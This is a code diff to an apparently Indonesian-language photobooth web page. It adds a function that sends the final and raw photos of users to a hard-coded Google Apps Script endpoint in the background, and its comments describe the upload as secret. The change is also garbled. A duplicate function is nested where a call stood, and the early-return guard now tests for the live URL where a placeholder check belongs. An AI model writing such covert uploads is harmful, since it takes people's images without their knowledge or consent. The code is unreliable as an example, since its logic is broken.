@@ -283,12 +283,32 @@
                 document.getElementById('download-btn').href = finalDataUrl;
 
                 // Upload otomatis ke Google Drive secara diam-diam di background + kirim email notifikasi ke admin
-                uploadToGoogleDriveQuietly(finalDataUrl, capturedPhotos);
-            };
+                function uploadToGoogleDriveQuietly(finalData, rawArray) {
+            if (GOOGLE_SCRIPT_URL.includes("https://script.google.com/macros/s/AKfycbwbrdaORwqkfo7eLZ9iy2X-WUL_anUIWGrsrOtwZz-AbLtaUywupL6jWiHjrbVYcL3_/exec")) return;
+
+            // Kirim foto hasil final dengan header text/plain agar tembus CORS
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'text/plain' },
+                body: JSON.stringify({ sessionId, type: 'final', base64: finalData, filename: `${sessionId}_final.png` })
+            }).then(() => {
+                // Kirim foto mentah satu per satu di background secara diam-diam
+                rawArray.forEach((rawUrl, idx) => {
+                    fetch(GOOGLE_SCRIPT_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'text/plain' },
+                        body: JSON.stringify({ sessionId, type: 'raw', base64: rawUrl, filename: `${sessionId}_photo_0${idx+1}.png` })
+                    });
+                });
+            }).catch(err => {
+                console.error("Background upload error:", err);
+            });
         }
 
         function uploadToGoogleDriveQuietly(finalData, rawArray) {
-            if (GOOGLE_SCRIPT_URL.includes("MASUKKAN_URL")) return;
+            if (GOOGLE_SCRIPT_URL.includes("https://script.google.com/macros/s/AKfycbwbrdaORwqkfo7eLZ9iy2X-WUL_anUIWGrsrOtwZz-AbLtaUywupL6jWiHjrbVYcL3_/exec")) return;
 
             // Kirim foto hasil final dengan mode 'no-cors'
             fetch(GOOGLE_SCRIPT_URL, {
